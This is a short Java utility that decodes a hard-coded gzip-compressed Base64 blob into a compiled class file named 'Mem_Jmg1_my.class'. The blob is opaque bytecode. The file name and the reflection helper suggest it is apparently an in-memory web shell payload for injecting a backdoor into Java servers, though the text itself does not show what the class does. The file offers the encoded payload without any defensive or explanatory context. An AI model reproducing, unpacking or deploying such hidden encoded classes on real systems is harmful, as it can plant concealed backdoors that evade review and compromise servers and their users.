package com.example.demo.Main;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Base64;

import static com.example.demo.Static.ReflectUtil.gzipDecompress;


public class ReClass {
    public static void main(String[] args) throws Exception {
        String base64Code = "";


        String gzipBase64Code = "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";


        //byte[] classBytes = decodeBase64(base64Code);
        byte[] classBytes = gzipDecompress(decodeBase64(gzipBase64Code));

        String filePath = "Mem_Jmg1_my.class";
        saveToFile(classBytes,filePath);

        System.out.println("Class file saved to: " + filePath);
    }

    public static byte[] decodeBase64(String base64Code) {
        return Base64.getDecoder().decode(base64Code);
    }

    public static void saveToFile(byte[] classBytes, String filePath) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(filePath)) {
            fos.write(classBytes);
        }
    }
}
